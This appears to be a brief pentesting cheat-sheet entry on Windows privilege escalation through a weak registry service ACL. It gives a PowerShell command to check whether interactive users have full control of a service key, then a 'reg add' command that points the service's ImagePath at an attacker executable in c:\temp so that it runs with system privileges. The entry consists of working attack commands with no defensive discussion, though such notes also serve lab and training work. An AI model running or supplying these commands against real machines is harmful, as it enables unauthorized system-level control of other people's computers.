# regsvc ACL privesc
Enumeration using PowerShell:
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsrv | fl
```
Check the output for 'NT AUTHORITY\INTERACTIVE' has 'Allow FullControl'
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsrv /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
